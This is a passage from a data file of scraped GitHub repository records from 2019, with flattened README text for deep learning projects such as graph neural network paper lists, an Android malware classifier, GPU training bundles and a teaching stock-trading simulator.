Schlichtkrull Thomas N Kipf Peter Bloem Rianne Van Den Berg Ivan Titov Max Welling venue arXiv 2017 03 Fast Linear Model for Knowledge Graph Embeddings author Armand Joulin Edouard Grave Piotr Bojanowski Maximilian Nickel Tomas Mikolov venue arXiv 2017 10 Convolutional 2D Knowledge Graph Embeddings author Tim Dettmers Pasquale Minervini Pontus Stenetorp Sebastian Riedel venue AAAI 2018 Knowledge Graph Embedding With Iterative Guidance From Soft Rules author Shu Guo Quan Wang Lihong Wang Bin Wang Li Guo venue AAAI 2018 KBGAN Adversarial Learning for Knowledge Graph Embeddings author Liwei Cai William Yang Wang venue NAACL 2018 Improving Knowledge Graph Embedding Using Simple Constraints author Boyang Ding Quan Wang Bin Wang Li Guo venue ACL 2018 SimplE Embedding for Link Prediction in Knowledge Graphs author Seyed Mehran Kazemi David Poole venue NeurIPS 2018 A Novel Embedding Model for Knowledge Base Completion Based on Convolutional Neural Network author Dai Quoc Nguyen Tu Dinh Nguyen Dat Quoc Nguyen Dinh Phung venue NAACL 2018 Iteratively Learning Embeddings and Rules for Knowledge Graph Reasoning author Wen Zhang Bibek Paudel Liang Wang Jiaoyan Chen Hai Zhu Wei Zhang Abraham Bernstein Huajun Chen venue WWW 2019 RotatE Knowledge Graph Embedding by Relational Rotation in Complex Space author Zhiqing Sun Zhi Hong Deng Jian Yun Nie Jian Tang venue ICLR 2019 Learning Attention based Embeddings for Relation Prediction in Knowledge Graphs author Deepak Nathani Jatin Chauhan Charu Sharma Manohar Kaul venue ACL 2019 Probabilistic Logic Neural Networks for Reasoning author Meng Qu Jian Tang venue arXiv 1906 Graph Neural Networks Revisiting Semi supervised Learning with Graph Embeddings author Zhilin Yang William W Cohen Ruslan Salakhutdinov venue ICML 2016 Semi Supervised Classification with Graph Convolutional Networks author Thomas N Kipf Max Welling venue ICLR 2017 Neural Message Passing for Quantum Chemistry author Justin Gilmer Samuel S Schoenholz Patrick F Riley Oriol Vinyals George E Dahl venue ICML 2017 Motif Aware Graph Embeddings author Hoang Nguyen Tsuyoshi Murata venue IJCAI 2017 Learning Graph Representations with Embedding Propagation author Alberto Garcia Duran Mathias Niepert venue NIPS 2017 Inductive Representation Learning on Large Graphs author William L Hamilton Rex Ying Jure Leskovec venue NIPS 2017 Graph Attention Networks author Petar Velikovi Guillem Cucurull Arantxa Casanova Adriana Romero Pietro Li Yoshua Bengio venue ICLR 2018 FastGCN Fast Learning with Graph Convolutional Networks via Importance Sampling author Jie Chen Tengfei Ma Cao Xiao venue ICLR 2018 Representation Learning on Graphs with Jumping Knowledge Networks author Keyulu Xu Chengtao Li Yonglong Tian Tomohiro Sonobe Ken ichi Kawarabayashi Stefanie Jegelka venue ICML 2018 Stochastic Training of Graph Convolutional Networks with Variance Reduction author Jianfei Chen Jun Zhu Le Song venue ICML 2018 Large Scale Learnable Graph Convolutional Networks author Hongyang Gao Zhengyang Wang Shuiwang Ji venue KDD 2018 Adaptive Sampling Towards Fast Graph Representation Learning author Wenbing Huang Tong Zhang Yu Rong Junzhou Huang venue NeurIPS 2018 Hierarchical Graph Representation Learning with Differentiable Pooling author Rex Ying Jiaxuan You Christopher Morris Xiang Ren William L Hamilton Jure Leskovec venue NeurIPS 2018 Bayesian Semi supervised Learning with Graph Gaussian Processes author Yin Cheng Ng Nicol Colombo Ricardo Silva venue NeurIPS 2018 Pitfalls of Graph Neural Network Evaluation author Oleksandr Shchur Maximilian Mumme Aleksandar Bojchevski Stephan Gnnemann venue arXiv 2018 11 Heterogeneous Graph Attention Network author Xiao Wang Houye Ji Chuan Shi Bai Wang Peng Cui P Yu Yanfang Ye venue WWW 2019 Bayesian graph convolutional neural networks for semi supervised classification author Yingxue Zhang Soumyasundar Pal Mark Coates Deniz stebay venue AAAI 2019 How Powerful are Graph Neural Networks author Keyulu Xu Weihua Hu Jure Leskovec Stefanie Jegelka venue ICLR 2019 LanczosNet Multi Scale Deep Graph Convolutional Networks author Renjie Liao Zhizhen Zhao Raquel Urtasun Richard S Zemel venue ICLR 2019 Graph Wavelet Neural Network author Bingbing Xu Huawei Shen Qi Cao Yunqi Qiu Xueqi Cheng venue ICLR 2019 Supervised Community Detection with Line Graph Neural Networks author Zhengdao Chen Xiang Li Joan Bruna venue ICLR 2019 Predict then Propagate Graph Neural Networks meet Personalized PageRank author Johannes Klicpera Aleksandar Bojchevski Stephan Gnnemann venue ICLR 2019 Invariant and Equivariant Graph Networks author Haggai Maron Heli Ben Hamu Nadav Shamir Yaron Lipman venue ICLR 2019 Capsule Graph Neural Network author Zhang Xinyi Lihui Chen venue ICLR 2019 MixHop Higher Order Graph Convolutional Architectures via Sparsified Neighborhood Mixing author Sami Abu El Haija Bryan Perozzi Amol Kapoor Nazanin Alipourfard Kristina Lerman Hrayr Harutyunyan Greg Ver Steeg Aram Galstyan venue ICML 2019 Graph U Nets author Hongyang Gao Shuiwang Ji venue ICML 2019 Disentangled Graph Convolutional Networks author Jianxin Ma Peng Cui Kun Kuang Xin Wang Wenwu Zhu venue ICML 2019 GMNN Graph Markov Neural Networks author Meng Qu Yoshua Bengio Jian Tang venue ICML 2019 Simplifying ,2019-07-08T14:10:38Z,2019-09-09T13:05:50Z,n/a,asw3asw,User,0,3,1,46,master,mnqu#KiddoZhu#Songweiping,3,0,0,0,0,0,0
rambasnet,DeepLearning-AndroidMalware,n/a,DeepLearning Android Malware Detecting and Classifying Android Malware using Deep Learning Techniques Dataset Downloaded from https www unb ca cic datasets andmal2017 html Data Cleanup dropped samples with Infinitiy values dropped samples witn NaN values dropped Flow ID Source IP Destination IP Timestamp columns features Datasets Summary Adware Labeled 10 Adware types with total 394716 samples build model to classify Adware types Adware Name Total SELFMITE 10266 YOMI 34163 SHUANET 35887 DOGWIN 39682 KEMOGE 36404 MOBIDASH 28614 FEIWO 53054 EWIND 37459 GOOLIGAN 89287 KOODOUS 29900 Benign TBD Ransomware TBD Scareware TBD SMSmalware TBD Deep Learning Frameworks perfomance results using various deep learning frameworks are compared Fastai Pytorch https www fast ai uses PyTorch https pytorch org as the backend Keras https keras io using Tensorflow and Theano as backend https www tensorflow org https github com Theano Theano Results Adware classification of adware types Framework Accuracy Fastai Pytorch 42 72 Keras Tensorflow Keras Theano Ransomware Framework Accuracy Fastai Pytorch Keras Tensorflow Keras Theano Scareware Framework Accuracy Fastai Pytorch Keras Tensorflow Keras Theano SMSmalware Framework Accuracy Fastai Pytorch Keras Tensorflow Keras Theano References Arash Habibi Lashkari Andi Fitriah A Kadir Laya Taheri and Ali A Ghorbani Toward Developing a Systematic Approach to Generate Benchmark Android Malware Datasets and Classification In the proceedings of the 52nd IEEE International Carnahan Conference on Security Technology ICCST Montreal Quebec Canada 2018,2019-06-27T03:56:13Z,2019-12-04T16:31:32Z,Jupyter Notebook,rambasnet,User,1,3,0,13,master,JohnsonClayton#rambasnet,2,0,0,1,0,0,0
JaimeTang,DeepLearningAndCv,n/a,,2019-07-01T14:15:42Z,2019-10-07T05:01:59Z,Jupyter Notebook,JaimeTang,User,0,3,0,64,master,JaimeTang,1,0,0,0,0,0,0
yemiekai,DeepLearningCode,n/a,DeepLearningCode codes of some deeplearning model Mainly use two frameworks 1 Pytorch 2 TensorFlow 1 14 0,2019-07-01T13:53:27Z,2019-10-11T11:50:26Z,Python,yemiekai,User,0,3,1,66,master,yemiekai,1,0,0,0,0,0,0
mrostomgharbi,DeepLearning-Labs-and-Courses,n/a,DeepLearning Labs and Courses Very interesting deep learning courses and labs with solutions Different fields are studied CNNs RNNs Triplet Loss GANs Seq2seq models etc,2019-07-11T10:08:15Z,2019-07-12T10:21:40Z,Jupyter Notebook,mrostomgharbi,User,0,3,0,15,master,mrostomgharbi,1,0,0,0,0,0,0
koshian2,DeepMosaicArt,n/a,DeepMosaicArt Generates mosaic arts automatically using deep learning summary jpg Original image nayoro jpg,2019-07-29T16:50:24Z,2019-08-15T03:09:28Z,Python,koshian2,User,1,3,0,7,master,koshian2,1,0,0,0,0,0,0
gradjitta,deep-learning-foundations-meetup,n/a,Deep learning foundations Machine learning study group Each week we ll be self learning an important aspect of deep learning with the suggested learning materials not always provided or your Googling Then implement for your chosen project can be one of the Kaggle competitions In the weekly meetup we ll go through participant s implementations and share discuss important points The actual topic is subject to change Week 1 overview Week 2 data preparation Week 3 CNN architecture Week 4 model training loss functions optimizer training loop Week 5 TOD exclamation Compulsory materials and assignments Week 1 Overview of Fastai deep learning Course material Learning goal Acquire a broad overview of what deep learning is and the important steps in the following week we ll dive into each step in more detail and implement it yourself Acquire an understanding of how to use fastai for quick deep learning implementation Mandatory material exclamation Overview of Fastai Fastai Lecture 1 https course fast ai videos lesson 1 exclamation Overview of Deep learning MIT Introduction of Deeplearning https www youtube com watch v JN6H4rQvwgY Week 2 Preparing data and environment for deep learning 1 Learn how to create virtual environments for your project conda env virtualenv 2 Learn how to prepare data loaders in pytorch and fastai pytorch https pytorch org tutorials beginner dataloadingtutorial html https stanford edu shervine blog pytorch how to generate data parallel fastai https docs fast ai datablock html 3 Learn how to prepare your specific project data into a dataloader ready for deep learning models Resources for deep learning topics You DON T need to learn all these lectures before you start the kaggle project meetup sessions The idea is to learn ONE topic per week in depth and implement it yourself with Kaggle project You DON T need to watch all of these courses you may choose the course that appeals to you the most and use others as supplementary materials Stanford CS230 Deep Learning http cs230 stanford edu Stanford CS231n Convolutional Neural Networks for Visual Recognition http cs231n stanford edu Previous meetup track on deep learning https github com SirongHuang Deep Learning Track MLMeetup blob master README md Final Projects Pick whichever project s that interests you Reproduce a paper of your choice using the knowledge from the lectures Work on the following kaggle challenges Blindness Detection https www kaggle com c aptos2019 blindness detection Pneumothorax Segmentation https www kaggle com c siim acr pneumothorax segmentation Cell image classification https www kaggle com c recursion cellular image classification Object detection https www kaggle com c open images 2019 object detection Visual relationship https www kaggle com c open images 2019 visual relationship Video understanding challenge https www kaggle com c youtube8m 2019,2019-07-03T09:53:48Z,2019-08-20T11:19:25Z,n/a,gradjitta,User,3,3,1,10,master,SirongHuang#gradjitta,2,0,0,1,0,0,0
cpark321,uncertainty-deep-learning,n/a,uncertainty deep learning Simple baselines for uncertainty estimation and model calibration 1 Bayes by Backprop ICML 2015 Weight Uncertainty in Neural Networks 2 Dropout as a Bayesian Approximation ICML 2016 https arxiv org abs 1506 02142 3 Deep Ensembles NIPS 2017 Simple and Scalable Predictive Uncertainty Estimation using Deep Ensembles 4 Temperature scaling ICML 2017 On Calibration of Modern Neural Networks Dependencies Python 3 6 PyTorch 1 1 Codes are heavily inspired by https joshfeldman net medium com albertoarrigoni github com gpleiss temperaturescaling Reference 1 Weight Uncertainty in Neural Networks 2 https arxiv org abs 1506 02142 3 What My Deep Model Doesn t Know Yarin Gal 4 Simple and Scalable Predictive Uncertainty Estimation using Deep Ensembles 5 On Calibration of Modern Neural Networks Weight Uncertainty in Neural Networks https arxiv org abs 1505 05424 https arxiv org abs 1506 02142 https arxiv org abs 1506 02142 What My Deep Model Doesn t Know Yarin Gal https www cs ox ac uk people yarin gal website blog3d801aa532c1ce html Simple and Scalable Predictive Uncertainty Estimation using Deep Ensembles https arxiv org abs 1612 01474 medium com albertoarrigoni https medium com albertoarrigoni paper review code deep ensembles nips 2017 c5859070b8ce github com gpleiss temperaturescaling https github com gpleiss temperaturescaling On Calibration of Modern Neural Networks https arxiv org abs 1706 04599,2019-07-31T16:47:31Z,2019-12-05T15:36:46Z,Jupyter Notebook,cpark321,User,1,3,0,7,master,cpark321,1,0,0,0,0,0,0
MaverickTK,MIT-Deep-Learning-Book,artificial-intelligence#deep-learning#deeplearningbook#machine-learning,Download https img shields io badge Download Book brightgreen svg https github com MaverickTK MIT Deep Learning Book raw master deeplearningbook pdf Deep Learning An MIT Press book Ian Goodfellow and Yoshua Bengio and Aaron Courville This is the most comprehensive book available on the deep learning and available as free html book for reading at http www deeplearningbook org http www deeplearningbook org says This repository contains The pdf version of the book which is available in html at http www deeplearningbook org Some useful links for this learning 1 Exercises http www deeplearningbook org exercises html 2 Lecture Slides http www deeplearningbook org lectureslides html 3 External links http www deeplearningbook org external html An MIT Press book Ian Goodfellow Yoshua Bengio and Aaron Courville The Deep Learning textbook is a resource intended to help students and practitioners enter the field of machine learning in general and deep learning in particular The online version of the book is now complete and will remain available online for free Citing the book To cite this book please use this bibtex entry bookGoodfellow et al 2016 title Deep Learning author Ian Goodfellow and Yoshua Bengio and Aaron Courville publisher MIT Press note urlhttp www deeplearningbook org year 2016,2019-08-01T16:49:58Z,2019-10-12T06:44:10Z,n/a,MaverickTK,User,1,3,1,7,master,MaverickTK#hardikkumar01,2,0,0,0,0,0,1
hpcc-systems,GPU-Deep-Learning,n/a,GPU Accelerated Neural Networks on HPCC Systems Platform Bundle for building training and consuming neural networks on HPCC Systems with GPU acceleration Description Large nueral networks typically train on very large datasets The size of the data combined with the size and complexity of neural networks result in large computational requirements Until now HPCC Systems is primarily a CPU based system which can result in neural network training times that are impractcally long With the use of modern GPUs the training time can be drastically reduced over using CPUs alone Getting Started Requirements You must have a compatible NVIDIA GPU for the GPU acceleration to work however this bundle will work on CPU alone albeit significantly slower CPUs are significanlty slower when it comes to training neural networks If you do not have GPU s available see Distributed Deep Learning https github com hpcc systems Distributed Deep Learning for use on CPU only instances There is a AWS AMI that was created for use with this bundle It is generated using this https github com xwang2713 cloud image build This produces an image with HPCC Systems Platform Community edition version 7 2 14 pre installed as well as all other requirements for this bundle including CUDA version 10 0 The image is designed to run on Amazon s P2 https aws amazon com ec2 instance types p2 or P3 https aws amazon com ec2 instance types p3 machines The Bundle is built around various open source Python libraries and requires you to use Python 3 This also means any custom runtims written in Python need to adhere to the Python 3 specifications Additionally and perhaps most importantly your cluster needs to be using the Python 3 version of pyembed In etc HPCCSystems environment conf on your node s on your cluster sudo nano etc HPCCSystems environment conf Change the the line with the additionalPlugins variable to be additionalPlugins python3 Then stop and start your cluster sudo systemct stop hpccsystems platform target sudo systemct start hpccsystems platform target Included Training Data Included are some popular Datasets Datasets datafiles used in experimenting with neural networks slightly modified for easy spraying on the HPCC Systems Platform The scripts used to generate the modified datasets is also included which uses the original datasets as a staring point MNIST Datasets datafiles mnist see reference http yann lecun com exdb mnist Fashion MNIST datafiles fashionmnist see reference https github com zalandoresearch fashion mnist IMDB Datasets datafiles imdb Boston Housing Datasets datafiles bostonhousing see reference https doi org 10 1016 0095 0696 78 90006 2 Reuters Datasets datafiles reuters Spraying Spray in the following way with similar names for the examples to work without modification MNIST Fixed size 785 Train mnist train Test mnist test Fashion MNIST Fixed size 785 Train fashionmnist train Test fashionmnist test IMDB CSV Train imdb train Test imdb test Boston Housing CSV Train bostonhousing train Test bostonhousing test Reuters CSV Train reuters train Test reuters test Examples Included in this bundle are some examples examples found in the examples directory It is recomended to start with an MLP trained on MNIST examples mnistmlp ecl Defining a Neural Network There are three different ways you can build neural networks with this bundle All three methods provide an example on how to build a 10 class MLP and train on the MNIST dataset The MLP has 2 hidden layers of size 512 each using the relu activation fucntion and a 10 class output layer with softmax as the activation All train for 20 epochs using batch size of 128 and it is expected to achieve a Test accuracy of roughly 98 The CNN is slightly different and gets 99 accuracy Using only ECL The first and easiest way is to use one of the predfined architecture types and define how many layers and neurons you want You can also hyperparameter tune using this method For example you can choose to build an MLP and then define the architecture specifics by passing in a SET of INTEGER such as number of hidden layers number of neurons in the each layer the activation functions This is done all in ECL See the MLP examples mnistmlp ecl ECL example The second method gives you more control over the arhictecture Use the model add part of the module to iteratively add layers until the desired architecture is realized See the MLP example examples mlpaddlayers ecl See the CNN example examples cnnaddlayers ecl Custom Architectures in Python The thrid method is the most complex in that it requires you to have working knowledge of Python and the underlying library You can define a custom neural network architecture using Keras or PyTorch and train via HPCC ECL Using this approach any keras defined model will easily be traininable and consumable on your HPCC Systems cluster See the MLP examples customtensorflowmlp ecl example See the CNN examples customtensorflowcnn ecl example Training Data Format Current included datasets and examples train on data in a specific HPCC format The records in the dataset are then converted into numpy arrays a very popular and robust way of representing scintific data in Python For example the MNIST data set is of the following format mnistdatatype RECORD INTEGER1 label DATA784 image END Here you can see that the first element is the label and the next element is a single DATA784 that includes all of the pixel data in it The data is then converted into a numpy array with a shape of 60000 784 Meaning an array 60 000 long one for each of the 60k images where each element in that array is another array with 784 pixels 28 x 28 images where the each row is layed end to end This can be seen in the MNIST data loading function in here Datasets mnist ecl L65 A more generalizable method to load other types of HPCC datasets into numpy arrays is needed and is included in the TODO section Using the Model Inference If you persist the model and use the model predict fucntion you can use a trained model to make predictions on any incoming data on your HPCC cluster as long as it has been prepared to the same format as the training data The prediction method outputs the result s in one hot encoded form in the following format oneHot RECORD SET of INTEGER class END A one hot encoded format for a 10 class output would be a set of 10 integers all of which are 0 except for one The index of the 1 will be the class that row of data was predicted to be i e a row that is predicted to belong to class 1 would be 1 0 0 0 0 0 0 0 0 0 0 TODO This is the planned future work that will expand upon this bundle Continue adding supported Keras layers into layers ecl layers ecl Full list starts here https keras io layers core Make custom data handlers for importing different formatted training data i e a more generalized data loader that takes HPCC Datasets and converts them into numpy arrays Add support for other commonly used training data input formats Author Robert K L Kennedy GitHub https github com robertken LinkedIn https www linkedin com in robertken,2019-08-05T19:54:12Z,2019-10-27T12:44:09Z,Jupyter Notebook,hpcc-systems,Organization,11,3,0,13,master,robertken#tlhumphrey2#arjunachala,3,0,0,0,0,0,2
JannisWolf,deep_q_learning_trader,n/a,FAU 2019 Preparations Abstract Python application to show AI functionality based on Keras and TensorFlow This is used for teaching at FAU 2019 Table Of Contents Abstract abstract Table Of Contents table of contents Overview overview Components components Stock Exchange stock exchange Trader trader Predictor predictor Required Tools required tools Installing Python and pip 3 on Mac installing python 3 and pip on mac Installing Python and pip 3 on Windows installing python 3 and pip on windows Optional Installing virtualenv optional installing virtualenv Run the Application run the application Clone the Repository clone the repository Create a Virtual Environment optional create a virtual environment optional Install All Dependencies install all dependencies Run run Development development IDE ide Overview Of This Repository overview of this repository Authors authors Overview This Python application simulates a computer based stock trading program Its goal is to demonstrate the basic functionality of neural networks trained by reinforcement learning deep Q learning The application consists of a stock exchange and several connected traders The stock exchange asks each trader once per day for its orders and executes any received ones Each trader computes its orders based on 1 stock market information provided by the stock exchange and 2 stock votes provided by some experts Both information may be inputs to the trader s neural network trained by reinforcement learning The following resources provide some basic introductions into the topic of neural networks and reinforcement learning AI The AI Revolution The Road to Superintelligence https waitbutwhy com 2015 01 artificial intelligence revolution 1 html Neural networks A Brief Introduction to Neural Networks http www dkriesel com science neuralnetworks Deep reinforcement learning Reinforcement Learning An Introduction http incompleteideas net book the book 2nd html Playing Atari with Deep Reinforcement Learning https arxiv org abs 1312 5602 Demystifying Deep Reinforcement Learning Intel Nervana https www intelnervana com demystifying deep reinforcement learning 30 Amazing Applications of Deep Learning http www yaronhadad com deep learning most amazing applications Python Learn Python Free Interactive Python Tutorial https www learnpython org en Welcome Components Stock Exchange The stock exchange represents the central metronome of the application It is implemented by a class StockExchange The stock exchange maintains both the stock prices and the trader s portfolios This means that all traders connected to the stock exchange are assigned one portfolio which the stock exchange manages to prevent fraud A portfolios comprises not only the inventory of all stocks and their quantity but also the available cash amount The stock exchange emulates trading days by calling the connected traders To keep it simple the traders are only called once at the end of the day The stock exchange then provides each trader with both the latest close prices and its respective portfolio A trader is supposed to reply with a list of orders which will be executed during the next day An order is one of the following actions for all stocks that are traded at the stock exchange Buy or sell After obtaining all orders for all connected traders the stock exchange executes the orders one by one This is only limited by checks whether the specific order is valid for a given portfolio That means for buying stocks the portfolio s cash reserve must suffice For selling stocks the corresponding quantity of stocks must reside in the portfolio Cash gained from stock sales will only be available for stock purchases the following day After executing all orders for all connected traders the current trading day has ended and the next one begins Trader Each trader is implemented by a separate trader class e g BuyAndHoldTrader or DeepQLearningTrader A trader gets the latest close prices and its current portfolio and returns a list of orders to the stock exchange For computing the orders a trader may employ a previously trained neural network Most traders additionally rely on one or more stock experts in the background Expert Each expert is implemented by a separate expert class e g ObscureExpert A expert works behind a trader and provides a vote buy hold or sell for a specific stock Required Tools This application relies on Python 3 thus the following tools are required Python 3 pip may come with your Python installation virtualenv optional Details on how to install these tools are listed below Installing Python 3 and pip on Mac On Mac there are two ways to install Python 3 The installer way Visit https www python org downloads release python 363 to install Python 3 The Homebrew way Visit http docs python guide org en latest starting install3 osx for a tutorial to install Python 3 using Homebrew Check if pip is installed with running pip version In case it is not already installed When using the installer Install pip separately by running python get pip py after downloading get pip py https bootstrap pypa io get pip py When using Homebrew Execute brew install pip Installing Python 3 and pip on Windows A good tutorial can be found here http docs python guide org en latest starting install3 win To ease running Python in the Command Line you should consider adding the Python installation directory to the PATH environment variable Check if pip is installed with running pip version In case it is not already installed run python get pip py after downloading get pip py https bootstrap pypa io get pip py Optional Installing virtualenv The easiest and cleanest way to install all required dependencies is virtualenv This keeps all dependencies in a specific directory which in turn will not interfere with your system s configuration This also allows for easier version switching and shipping To install virtualenv run pip install virtualenv Run the Application After installing all required tools Python pip virtualenv execute the following commands Clone the Repository git clone cd Create a Virtual Environment optional If you want to use virtualenv create a virtual environment The directory virtualenv is already added to gitignore On Mac virtualenv p python3 virtualenv source virtualenv bin activate On Windows virtualenv p pathtopython3installationdir python virtualenv virtualenv Scripts activate Install All Dependencies This installs all required dependencies by Trader AI pip install r requirements txt Run python stockexchange py After some Terminal action this should show a diagram depicting the course of different portfolios which use different Trader implementations respectively Furthermore you can execute the test suite to see if all works well python testrunner py Development IDE There are no specific requirements for developing a Python application You can open your favorite text editor notepad exe TextEdit vim Notepad sublime Atom emacs type in some code and run it with python your file py However there are some IDEs which make developing and running Python applications more convenient We worked with the following JetBrains PyCharm jetbrains com pycharm PyDev http www pydev org based on Eclipse In your IDE you may have to select the correct Python environment Most IDEs can detect the correct environment automatically To check and if needed select the correct Python installation directory or the virtualenv directory inside your repository do as follows PyCharm Visit Preferences Project xxx Project Interpreter and check if the correct environment is selected If not select the gear symbol in the upper right PyDev Visit Window Preferences PyDev Interpreters Python Interpreter and check if the correct environment is selected If not select New Overview Of This Repository This repository contains a number of packages and files The following provides a short overview datasets CSV dumps of the used stock prices experts Python package that contains all experts framework Python package that contains the whole framework around the stock exchange traders Python package that contains all traders directories py Contains some project wide Python constants README md This file requirements txt Contains an export of all project dependencies by running pip freeze requirements txt stockexchange py Contains the central main method This starts ILSE testrunner py Runs the test suite with all test cases Authors Jannis Wolf mailto jannis wolf fau de Richard Mller mailto richard mueller senacor com Christian Neuhaus mailto christian neuhaus senacor com Jonas Holtkamp mailto jonas holtkamp senacor com Janusz Tymoszuk mailto janusz tymoszuk senacor com,2019-07-28T21:14:07Z,2019-10-25T17:23:51Z,Python,JannisWolf,User,1,3,2,4,master,JannisWolf,1,0,1,1,0,2,0
aayushkubb,Deep_Learning_Tutorial,n/a,DeepLearningTutorial Open Sourcing all my deep learning tutorials and cheet sheets,2019-07-12T22:09:09Z,2019-11-23T03:59:45Z,Jupyter Notebook,aayushkubb,User,1,3,0,2,master,aayushkubb,1,0,0,0,0,0,0
chapter19,Deep-Learning-from-Scratch,n/a,Python 2018 Python O REILLY 88 1 5 numpy 15 numpy ipynb 1 6 matplotlib 16 matplotlib ipynb 2 2 perceptron ipynb 3 3 NeuralNetworks ipynb 4 4 NeuralNetworksLearning ipynb 5 5 ErrorBackPropagation ipynb 6 6 SkillsAboutLearning ipynb 7 7 ConvolutionalNeuralNetwork ipynb 8 8 DeepLearning ipynb,2019-07-31T12:41:04Z,2019-09-17T10:47:27Z,Jupyter Notebook,chapter19,User,1,3,0,10,master,chapter19,1,0,0,0,0,0,0
StardustDL,DeepCard,asp-net-core#crnn#ctpn#deep-learning#docker#dotnet-core#pytorch,DeepCard https img shields io badge platform linux blue svg https img shields io github license StardustDL DeepCard svg https img shields io github repo size StardustDL DeepCard svg https img shields io librariesio github StardustDL DeepCard svg https img shields io docker pulls stardustdl deepcard svg A bank card number recognition system based on deep learning docs preview png Usage 1 Install Docker and Docker Compose 2 Clone this repository and enter the deploy directory docker deploy 3 Use docker compose up d to start 4 Visit http localhost 8550 to use it A demo app is running on http localhost 8500 Dependences 1 Python 2 OpenCV 3 Pytorch 4 NET Core 3 0 5 Alipay bank card API Only for querying bank card information Collaborators courao https github com courao mitdalao https github com mitdalao GreatTMZ https github com GreatTMZ,2019-07-13T03:53:05Z,2019-11-04T09:53:45Z,Python,StardustDL,User,2,3,0,1,master,StardustDL,1,0,0,1,0,0,0
wangxiao5791509,Tracking-with-Deep-Reinforcement-Learning,n/a,The Paper Collection of Tracking Algorithms based on Deep Reinforcement Learning 1 Huang Chen Simon Lucey and Deva Ramanan Learning policies for adaptive tracking with deep feature cascades In Proceedings of the IEEE International Conference on Computer Vision pp 105 114 2017 2 Ren Liangliang Xin Yuan Jiwen Lu Ming Yang and Jie Zhou Deep reinforcement learning with iterative shift for visual tracking In Proceedings of the European Conference on Computer Vision ECCV pp 684 700 2018 3 ACT Boyu Chen Dong Wang Peixia Li Huchuan Lu Real time Actor Critic Tracking ECCV 2018 4 p tracker James Supani III Deva Ramanan Tracking as Online Decision Making Learning a Policy From Streaming Videos With Reinforcement Learning ICCV 2017 5 ADNet Sangdoo Yun Jongwon Choi Youngjoon Yoo Kimin Yun Jin Young Choi Action Decision Networks for Visual Tracking with Deep Reinforcement Learning CVPR 2017 Spotlight 6 RDT Janghoon Choi Junseok Kwon Kyoung Mu Lee Visual Tracking by Reinforced Decision Making arXiv 2017 7 RLT Da Zhang Hamid Maei Xin Wang Yuan Fang Wang Deep Reinforcement Learning for Visual Object Tracking in Videos arXiv 2017 8 Xiao Wang Chenglong Li Bin Luo Jin Tang SINT Robust Visual Tracking via Adversarial Positive Instance Generation CVPR 2018 9 Zhang Da Hamid Maei Xin Wang and Yuan Fang Wang Deep reinforcement learning for visual object tracking in videos arXiv preprint arXiv 1701 08936 2017 10 Kamalapurkar Rushikesh Lindsey Andrews Patrick Walters and Warren E Dixon Model based reinforcement learning for infinite horizon approximate optimal tracking IEEE transactions on neural networks and learning systems 28 no 3 2016 753 758 11 Xiang Yu Alexandre Alahi and Silvio Savarese Learning to track Online multi object tracking by decision making In Proceedings of the IEEE international conference on computer vision pp 4705 4713 2015 12 Zhang Da Hamid Maei Xin Wang and Yuan Fang Wang Deep reinforcement learning for visual object tracking in videos arXiv preprint arXiv 1701 08936 2017 13 Luo Wenhan Peng Sun Fangwei Zhong Wei Liu Tong Zhang and Yizhou Wang End to end active object tracking via reinforcement learning arXiv preprint arXiv 1705 10561 2017 14 Luo Biao Derong Liu Tingwen Huang and Ding Wang Model free optimal tracking control via critic only Q learning IEEE transactions on neural networks and learning systems 27 no 10 2016 2134 2144 15 Dong Xingping Jianbing Shen Wenguan Wang Yu Liu Ling Shao and Fatih Porikli Hyperparameter optimization for tracking with continuous deep q learning In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition pp 518 527 2018 16 Ren Liangliang Jiwen Lu Zifeng Wang Qi Tian and Jie Zhou Collaborative deep reinforcement learning for multi object tracking In Proceedings of the European Conference on Computer Vision ECCV pp 586 602 2018 17 Bae Seung Hwan and Kuk Jin Yoon Confidence based data association and discriminative deep appearance learning for robust online multi object tracking IEEE transactions on pattern analysis and machine intelligence 40 no 3 2017 595 610 18 Liu Xiaobai Qian Xu Thuan Chau Yadong Mu Lei Zhu and Shuicheng Yan Revisiting jump diffusion process for visual tracking a reinforcement learning approach IEEE Transactions on Circuits and Systems for Video Technology 2018 19 Yun Sangdoo Jongwon Choi Youngjoon Yoo Kimin Yun and Jin Young Choi Action driven visual object tracking with deep reinforcement learning IEEE transactions on neural networks and learning systems 29 no 6 2018 2239 2252 20 Jiang Ming xin Chao Deng Zhi geng Pan Lan fang Wang and Xing Sun Multiobject Tracking in Videos Based on LSTM and Deep Reinforcement Learning Complexity 2018 2018 21,2019-07-30T06:18:12Z,2019-11-09T09:27:24Z,n/a,wangxiao5791509,User,1,3,0,1,master,wangxiao5791509,1,0,0,0,0,0,0
shaghayeghjalali96,movie-recommender-system,colab-notebook#collaborative-filtering#content-based-recommendation#deep-learning#item-based-recommendation#keras#machine-learning#movielens-dataset#python#recommender-system#user-based-recommendation,movie recommender system The final project of a deep learning make a recommender system with movielen datasets Getting Started Create an account on Google Colab and upload a cloned file in it git clone https github com shaghayeghjalali96 movie recommender system,2019-07-20T21:14:20Z,2019-08-31T17:52:09Z,Jupyter Notebook,shaghayeghjalali96,User,0,3,0,4,master,shaghayeghjalali96,1,0,0,0,0,0,0
Longseabear,LEaps_PytorchFrameWork,n/a,LEapsPytorchFrameWork pytorch deep learning framework This project covers pytorch basic framework,2019-08-03T17:04:59Z,2019-08-10T11:54:41Z,Python,Longseabear,User,1,3,0,4,master,Longseabear,1,0,0,0,0,0,0
2vin,deep-gesture-recognition,n/a,deep gesture recognition Open source gesture recognition using deep learning This repo contains the code for detecting hand gestures using deep learning Installation 1 Clone this repository https github com 2vin deep gesture recognition 2 Install dependencies using pip install r requirements txt 3 Run the command python infgesture py 4 In order to change camera index or video path edit the VideoCapture command in the file infgesture py Supported Gestures We have open sources this model with three supported gestures https raw githubusercontent com 2vin deep gesture recognition master data palmgesture jpg PALM https raw githubusercontent com 2vin deep gesture recognition master data okgesture jpeg OK https raw githubusercontent com 2vin deep gesture recognition master data thumbgesture jpeg THUMB Results This model can detect three of the above mentioned gestures under varying pose lighting and rotation Have a look at how it performed on realtime camera feed gesture Recognition https raw githubusercontent com 2vin deep gesture recognition master data gesture gif Results For more details contact me on www connect vin,2019-07-21T18:32:47Z,2019-12-09T10:42:05Z,Python,2vin,User,0,3,1,19,master,2vin,1,0,0,0,0,0,0
